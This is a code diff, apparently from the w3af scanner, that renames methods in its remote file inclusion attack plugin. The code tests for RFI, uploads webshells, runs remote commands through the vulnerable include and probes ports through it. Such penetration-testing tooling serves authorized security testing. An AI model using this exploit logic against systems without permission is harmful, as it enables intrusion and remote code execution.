@@ -75,7 +75,7 @@ class rfi(AttackPlugin):
         '''
         return self._shell
 
-    def canExploit(self, vuln_to_exploit=None):
+    def can_exploit(self, vuln_to_exploit=None):
         '''
         Searches the kb for vulnerabilities that this plugin can exploit, this
         is overloaded from AttackPlugin because I need to test for xss vulns
@@ -127,11 +127,11 @@ class rfi(AttackPlugin):
 
                         try:
                             http_res = function_reference(
-                                xss_vuln.getURL(), str(data_container))
+                                xss_vuln.get_url(), str(data_container))
                         except:
                             continue
                         else:
-                            if test_string in http_res.getBody():
+                            if test_string in http_res.get_body():
                                 self._xss_vuln = xss_vuln
                                 return True
 
@@ -182,7 +182,7 @@ class rfi(AttackPlugin):
             # Create the shell object
             shell_obj = RFIShell(vuln_obj)
             shell_obj.set_url_opener(self._uri_opener)
-            shell_obj.setExploitDc(self._exploit_dc)
+            shell_obj.set_exploit_dc(self._exploit_dc)
             return shell_obj
 
         elif exploit_success == SUCCESS_OPEN_PORT:
@@ -202,7 +202,7 @@ class rfi(AttackPlugin):
         @return : True if vuln can be exploited.
         '''
         # Create the shell
-        extension = vuln.getURL().getExtension()
+        extension = vuln.get_url().get_extension()
 
         # I get a list of tuples with file_content and extension to use
         shell_list = shell_handler.get_webshells(extension)
@@ -229,7 +229,7 @@ class rfi(AttackPlugin):
 
             try:
                 http_res = function_reference(
-                    vuln.getURL(), str(data_container))
+                    vuln.get_url(), str(data_container))
             except:
                 continue
             else:
@@ -254,14 +254,14 @@ class rfi(AttackPlugin):
 
             try:
                 http_response = function_reference(
-                    vuln.getURL(), str(data_container))
+                    vuln.get_url(), str(data_container))
             except:
                 return False
             else:
                 rfi_errors = ['php_network_getaddresses: getaddrinfo',
                               'failed to open stream: Connection refused in']
                 for error in rfi_errors:
-                    if error in http_response.getBody():
+                    if error in http_response.get_body():
                         return SUCCESS_OPEN_PORT
 
         return NO_SUCCESS
@@ -272,7 +272,7 @@ class rfi(AttackPlugin):
         URL pointing to a XSS bug, or our local webserver.
         '''
         if self._use_XSS_vuln and self._xss_vuln:
-            url = self._xss_vuln.getURL().uri2url()
+            url = self._xss_vuln.get_url().uri2url()
             data_container = self._xss_vuln.get_dc()
             data_container = data_container.copy()
             data_container[self._xss_vuln.get_var()] = file_content
@@ -401,16 +401,16 @@ class PortScanShell(shell):
         function_reference = getattr(self._uri_opener, self.get_method())
         try:
             http_response = function_reference(
-                self.getURL(), str(port_open_dc))
+                self.get_url(), str(port_open_dc))
         except w3afException, w3:
             return 'Exception from the remote web application: "%s"' % w3
         except Exception, e:
             return 'Unhandled exception, "%s"' % e
         else:
-            if 'HTTP request failed!' in http_response.getBody():
+            if 'HTTP request failed!' in http_response.get_body():
                 #    The port is open but it's not an HTTP daemon
                 return True
-            elif 'failed to open stream' not in http_response.getBody():
+            elif 'failed to open stream' not in http_response.get_body():
                 #    Open port, AND HTTP daemon
                 return True
             else:
@@ -435,7 +435,7 @@ class RFIShell(exec_shell, PortScanShell):
 
         self._exploit_dc = None
 
-    def setExploitDc(self, e_dc):
+    def set_exploit_dc(self, e_dc):
         '''
         Save the exploit data container, that holds all the parameters for a
         successful exploitation
@@ -444,7 +444,7 @@ class RFIShell(exec_shell, PortScanShell):
         '''
         self._exploit_dc = e_dc
 
-    def getExploitDc(self):
+    def get_exploit_dc(self):
         '''
         Get the exploit data container.
         '''
@@ -461,19 +461,19 @@ class RFIShell(exec_shell, PortScanShell):
         @param command: The command to handle ( ie. "read", "exec", etc ).
         @return: The result of the command.
         '''
-        e_dc = self.getExploitDc()
+        e_dc = self.get_exploit_dc()
         e_dc = e_dc.copy()
         e_dc['cmd'] = command
 
         function_reference = getattr(self._uri_opener, self.get_method())
         try:
-            http_res = function_reference(self.getURL(), str(e_dc))
+            http_res = function_reference(self.get_url(), str(e_dc))
         except w3afException, w3:
             return 'Exception from the remote web application:' + str(w3)
         except Exception, e:
             return 'Unhandled exception from the remote web application:' + str(e)
         else:
-            return shell_handler.extract_result(http_res.getBody())
+            return shell_handler.extract_result(http_res.get_body())
 
     def end(self):
         '''
@@ -481,7 +481,7 @@ class RFIShell(exec_shell, PortScanShell):
         '''
         om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
-            self._rm_file(self.getExploitDc()[self.get_var()])
+            self._rm_file(self.get_exploit_dc()[self.get_var()])
         except Exception, e:
             msg = 'Remote file inclusion shell cleanup failed with exception: %s'
             om.out.error(msg % e)
